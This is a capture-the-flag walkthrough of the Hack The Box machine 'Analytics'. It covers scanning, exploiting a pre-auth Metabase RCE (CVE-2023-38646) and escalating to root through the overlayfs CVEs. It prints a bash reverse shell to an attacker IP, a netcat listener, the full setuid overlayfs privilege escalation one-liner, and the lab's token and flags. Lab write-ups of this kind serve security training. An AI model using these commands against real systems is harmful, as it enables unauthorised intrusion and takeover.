# Analytics

<div align="left"><figure><img src="../.gitbook/assets/image (298).png" alt="" width="120"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure></div>

🔗 [Analytics](https://www.hackthebox.com/machines/analytics)

### Task 1 - Deploy the machine

🎯 Target IP: `10.129.229.224`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "10.129.229.224 analytics.htb" >> /etc/hosts
</strong>
mkdir -p htb/analytics.htb
cd htb/analytics.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 analytics.htb
PING analytics.htb (10.129.229.224) 56(84) bytes of data.
64 bytes from analytics.htb (10.129.229.224): icmp_seq=1 ttl=63 time=64.4 ms
64 bytes from analytics.htb (10.129.229.224): icmp_seq=2 ttl=63 time=67.6 ms
64 bytes from analytics.htb (10.129.229.224): icmp_seq=3 ttl=63 time=59.7 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a \*nix system, while Windows systems usually have a TTL of 128 secs.

### 2.1 - How many open TCP ports are listening on Analytics?

```bash
nmap -p0- -sS -Pn -vvv analytics.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open TCP ports on the machine: 22, 80.

{% hint style="info" %}
2
{% endhint %}

### 2.2 - What subdomain is configured to provide a different application on the target web server?

Now, we take more precise scan utilizing -sCV flags to retrieve versioning services and test common scripts.

```bash
nmap -p22,80 -sS -Pn -n -v -sCV -T4 analytics.htb -oG nmap/port_scan
```

```
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  tcpwrapped
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since we lack credentials for SSH login, we will begin by examining port 80.

#### Port 80

Seeing http-title there's a new subdomain: http://analytical.htb/ and browsing on http port we notice there're being redirected (status code 302) to analytical.htb.

We can confirm it using a web proxy such as Burp Suite:

<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

To resolve this, we add the domain to our /etc/hosts file

<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

The task is to retrieve a new subdomain configured to provide a different application on the target web server, we found it discovering source code of web page:

<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

This URL refers to login page, and to resolve it we need to add it to /etc/hosts

<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
data.analytical.htb
{% endhint %}

### 2.3 - What application is running on data.analytical.htb?

By running WhatWeb or simply viewing the page, we discover that there is a Metabase web application.

```bash
whatweb http://data.analytical.htb/
http://data.analytical.htb/ [200 OK] Cookies[metabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[metabase.DEVICE], IP[10.129.229.224], Script[application/json], Strict-Transport-Security[max-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Metabase
{% endhint %}

### 2.4 -  What version of Metabase is the target running?

Using WhatWeb and an nmap scan, we were able to discover the Metabase version. However, it is simpler to retrieve this information by viewing the source code of the web page.

<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
v0.46.6
{% endhint %}



### 2.5 - What is the 2023 CVE ID assigned to the pre-authentication, remote code execution vulnerability in this version of Metabase?

Googling it, we found CVE ID relative to Metabase v0.46.6

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-38646" %}

{% hint style="info" %}
CVE-2023-38646
{% endhint %}

### 2.6 - What is the value of the `setup-token` used by this Metabase instance?

Using the same methodology of the task 2.4, we can reach setup-token into source code

{% hint style="info" %}
249fa03d-fd94-4d5b-b94f-b4ebf3df681f
{% endhint %}

### 2.7 - Which Metabase API endpoint is used to execute arbitrary commands using the token?

We discover it reading documentation of the team that discovered this vulnerability

{% embed url="https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646" %}

<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/api/setup/validate
{% endhint %}

### 2.8 -  Which user is the Metabase application running as?

\
To answer for this question we need to exploit vulnerabilities with python script on github and web app parameters

{% embed url="https://github.com/m3m0o/metabase-pre-auth-rce-poc" %}

Github repo suggests following usage:

The script needs the **target URL**, the **setup token** and a **command** that will be executed. The setup token can be obtained through the `/api/session/properties` endpoint. Copy the value of the `setup-token` key.

The **command** will be executed on the target machine with the intention of obtaining a **reverse shell**. You can find different options in [RevShells](https://revshells.com/). Having the **setup-token** value and the **command** that will be executed, you can run the script with the following command:

`python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"`

All right, then we make me in listening mode on port 1339 on attacker machine using netcat

```
nc -nvlp 1339
```

<figure><img src="../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

we save exploit locally and run following command

```
python3 exploit.py -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -u "http://data.analytical.htb" -c "bash -i >& /dev/tcp/10.10.14.6/1339 0>&1"
```

and we're in

<figure><img src="../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
metabase
{% endhint %}

### 2.9 -  Which environment variable contains the password for the metalytics user?

This questions take us an important hint to understand what we can do.

Infact, using command export, that show us environment variable we found credentials

<figure><img src="../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
META\_PASS
{% endhint %}

### Task 3 - Find user flag

### 3.1 - Submit the flag located in the metalytics user's home directory.

Upon checking with `sudo -l`, we found that we do not have permissions. However, considering we have discovered another open port 22 (SSH), we can attempt to use the credentials we just found to log in.

`ssh metalytics@analytics.htb`

<figure><img src="../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

5d03664f2ed9ba6767660926fcaa97b9

</details>

### 3.2 - What kernel version is installed on the host system?

We use `uname -a` command to display kernel version

<div align="left"><figure><img src="../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
6.2.0-25-generic
{% endhint %}

### 3.3 - What Ubuntu release is the system running?

We can use `lsb_release -a` or `cat /etc/os-release`\


<figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
UBUNTU 22.04.03 LTS (JAMMY)
{% endhint %}

### 3.4 - What component used by the Ubuntu operating system on the target system is vulnerable to a privileges escalation vulnerability assigned two 2023 CVEs?

After finding an old version of the kernel, I'll search on Google to find a public exploit.

{% embed url="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" %}

{% hint style="info" %}
overlayfs
{% endhint %}

### Task 4 - Find root flag

### 4.1 - Submit the flag located in the root user's home directory.

As explained into github below, we can do GameOver(lay) Ubuntu Privilege Escalation

{% embed url="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----fd256a170fae--------------------------------" %}

Then, executing bash script, we have become root and can now access the root flag.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

<figure><img src="../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

2ec3181b64936d66aae6e2bc1215a477

</details>

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
